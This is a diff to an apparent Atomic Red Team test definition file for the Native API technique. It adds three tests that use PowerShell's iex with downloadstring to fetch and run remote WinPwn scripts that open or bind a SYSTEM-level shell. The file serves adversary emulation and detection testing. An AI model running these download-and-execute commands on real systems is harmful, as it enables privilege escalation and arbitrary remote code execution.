@@ -20,4 +20,30 @@ atomic_tests:
       C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /out:"#{output_file}" /target:exe #{source_file}
       %tmp%/T1106.exe
     name: command_prompt
-
+- name: WinPwn - Get SYSTEM shell - Pop System Shell using CreateProcess technique
+  auto_generated_guid: ce4e76e6-de70-4392-9efe-b281fc2b4087
+  description: Get SYSTEM shell - Pop System Shell using CreateProcess technique via function of WinPwn
+  supported_platforms:
+  - windows
+  executor:
+    command: |-
+      iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/CreateProcess/Get-CreateProcessSystem.ps1')
+    name: powershell
+- name: WinPwn - Get SYSTEM shell - Bind System Shell using CreateProcess technique
+  auto_generated_guid: 7ec5b74e-8289-4ff2-a162-b6f286a33abd
+  description: Get SYSTEM shell - Bind System Shell using CreateProcess technique via function of WinPwn
+  supported_platforms:
+  - windows
+  executor:
+    command: |-
+      iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/CreateProcess/Get-CreateProcessSystemBind.ps1')
+    name: powershell
+- name: WinPwn - Get SYSTEM shell - Pop System Shell using NamedPipe Impersonation technique
+  auto_generated_guid: e1f93a06-1649-4f07-89a8-f57279a7d60e
+  description: Get SYSTEM shell - Pop System Shell using NamedPipe Impersonation technique via function of WinPwn
+  supported_platforms:
+  - windows
+  executor:
+    command: |-
+      iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/NamedPipe/NamedPipeSystem.ps1')
+    name: powershell
